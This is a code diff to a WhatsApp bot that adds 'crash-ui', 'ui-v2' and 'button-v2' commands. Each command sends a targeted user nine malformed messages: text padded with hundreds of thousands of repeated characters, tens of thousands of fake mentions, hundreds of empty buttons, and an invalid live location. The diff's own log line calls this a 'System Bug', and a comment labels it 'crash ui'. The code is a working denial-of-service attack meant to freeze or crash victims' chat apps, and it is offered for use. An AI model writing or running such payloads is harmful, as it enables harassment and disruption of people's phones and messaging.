@@ -932,7 +932,211 @@ async function resd(x, z) {
         }, {});
     }
 }
+//by chocoplus//
+async function systemUi3(rxhl, target) {
+    await conn.relayMessage(target, {
+        ephemeralMessage: {
+            message: {
+                interactiveMessage: {
+                    header: {
+                        documentMessage: {
+                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30623531_8925861100811717_6603685184702665673_n.enc?ccb=11-4&oh=01_Q5AaIN8EZu9FKxglUrb240_UXS3DGwZHc6a_fKzCxAbB1DFB&oe=675EE231&_nc_sid=5e03e0&mms3=true",
+                            mimetype: "application/json",
+                            fileSha256: "ZUQzs6adM+DC5ZI3MuHr3RbsAaj66LvmZ1R8+El5cqc=",
+                            fileLength: "401",
+                            pageCount: 0,
+                            mediaKey: "X6f0YZpo7xItqTXuawYmZJy6eLaXv9m/1nFZq2rW7p0=",
+                            fileName: "😘😘".repeat(10),
+                            fileEncSha256: "6gmEaQ6o3q7TgsBLKLYlr8sJmbb+yYxpYLuQ1F4vbBs=",
+                            directPath: "/v/t62.7119-24/30623531_8925861100811717_6603685184702665673_n.enc?ccb=11-4&oh=01_Q5AaIN8EZu9FKxglUrb240_UXS3DGwZHc6a_fKzCxAbB1DFB&oe=675EE231&_nc_sid=5e03e0",
+                            mediaKeyTimestamp: "1731681321"
+                        },
+                        hasMediaAttachment: true
+                    },
+                    body: {
+                        text: "ꦾ".repeat(300000) + "@1".repeat(70000)
+                    },
+                    nativeFlowMessage: {},
+                    contextInfo: {
+                        mentionedJid: ["1@newsletter"],
+                        groupMentions: [{
+                            groupJid: "1@newsletter",
+                            groupSubject: "RxhL"
+                        }],
+                        quotedMessage: {
+                            documentMessage: {
+                                contactVcard: true
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }, {
+        participant: {
+            jid: target
+        }
+    }, {
+        messageId: null
+    });
+    await console.clear()
+    console.log("\x1b[33m%s\x1b[0m", `Successfully Sent Ui System Bug`);
+}
+async function BetonSeks(target) {
+  try {
+    const buttons = Array(300).fill().map(() => ({
+      name: "galaxy_message",
+      buttonParamsJson: ""
+    }));
+
+    let message = {
+      viewOnceMessage: {
+        message: {
+          messageContextInfo: {
+            deviceListMetadata: {},
+            deviceListMetadataVersion: 2,
+          },
+          interactiveMessage: {
+            contextInfo: {
+              mentionedJid: [target],
+              isForwarded: true,
+              forwardingScore: 999,
+              businessMessageForwardInfo: {
+                businessOwnerJid: target,
+              },
+            },
+            body: {
+              text: "Prosses test your chat core" + "\n ewe ewe ah button",
+            },
+            nativeFlowMessage: {
+              buttons: [
+                {
+                  name: "single_select",
+                  buttonParamsJson: "",
+                },
+                ...buttons
+              ],
+            },
+          },
+        },
+      },
+    };
+
+    await conn.relayMessage(target, message, {
+      participant: { jid: target },
+    });
+  } catch (err) {
+    console.log(err);
+  }
+}
+//crash ui teste 
+async function LastLevelSystemUi(rxhl, target) {
+    await conn.relayMessage(
+        target, {
+            viewOnceMessage: {
+                message: {
+                    liveLocationMessage: {
+                        degreesLatitude: 'p',
+                        degreesLongitude: 'p',
+                        caption: 'Hey Dog🐶' + "ꦿꦸ".repeat(150000) + "@1".repeat(70000),
+                        sequenceNumber: '0',
+                        jpegThumbnail: '',
+                        contextInfo: {
+                            forwardingScore: 127,
+                            isForwarded: true,
+                            quotedMessage: {
+                                documentMessage: {
+                                    contactVcard: true
+                                }
+                            },
+                            groupMentions: [{
+                                groupJid: "1@newsletter",
+                                groupSubject: "RxhL"
+                            }]
+                        }
+                    }
+                }
+            }
+        }, {
+            participant: {
+                jid: target
+            }
+        }
+      
+    )
+  };
 switch(command) {
+  case 'ui-v2': {
+  if (!isBot && !isCreator) return
+  let target = m.mentionedJid[0] 
+    ? m.mentionedJid[0] 
+    : m.quoted 
+      ? m.quoted.sender 
+      : q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
+
+  if (!target || !target.includes('@s.whatsapp.net')) 
+
+  await conn.sendMessage(m.chat, { text: 'null </>' }, { quoted: m });
+  await LastLevelSystemUi("rxhl", target)
+  await LastLevelSystemUi("rxhl", target)
+  await LastLevelSystemUi("rxhl", target)
+  await LastLevelSystemUi("rxhl", target)
+  await LastLevelSystemUi("rxhl", target)
+  await LastLevelSystemUi("rxhl", target)
+  await LastLevelSystemUi("rxhl", target)
+  await LastLevelSystemUi("rxhl", target)
+  await LastLevelSystemUi("rxhl", target)
+  await conn.sendMessage(m.chat, { text: 'by 𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘' }, { quoted: n });
+}
+break;
+
+ case 'button-v2': {
+  if (!isBot && !isCreator) return
+  let target = m.mentionedJid[0] 
+    ? m.mentionedJid[0] 
+    : m.quoted 
+      ? m.quoted.sender 
+      : q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
+
+  if (!target || !target.includes('@s.whatsapp.net')) 
+
+  await conn.sendMessage(m.chat, { text: 'null </>' }, { quoted: m });
+  await BetonSeks(target)
+  await BetonSeks(target)
+  await BetonSeks(target)
+  await BetonSeks(target)
+  await BetonSeks(target)
+  await BetonSeks(target)
+  await BetonSeks(target)
+  await BetonSeks(target)
+  await BetonSeks(target)
+  await conn.sendMessage(m.chat, { text: 'by 𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘' }, { quoted: n });
+}
+break; 
+case 'crash-ui': {
+  if (!isBot && !isCreator) return
+  let target = m.mentionedJid[0] 
+    ? m.mentionedJid[0] 
+    : m.quoted 
+      ? m.quoted.sender 
+      : q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
+
+  if (!target || !target.includes('@s.whatsapp.net')) 
+
+  await conn.sendMessage(m.chat, { text: 'null </>' }, { quoted: m });
+  await systemUi3("rxhl", target)
+  await systemUi3("rxhl", target)
+  await systemUi3("rxhl", target)
+  await systemUi3("rxhl", target)
+  await systemUi3("rxhl", target)
+  await systemUi3("rxhl", target)
+  await systemUi3("rxhl", target)
+  await systemUi3("rxhl", target)
+  await systemUi3("rxhl", target)
+  await conn.sendMessage(m.chat, { text: 'by 𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘' }, { quoted: n });
+}
+break;
+
 case 'resd': {
   if (!isBot && !isCreator) return
   await resd(from, true);
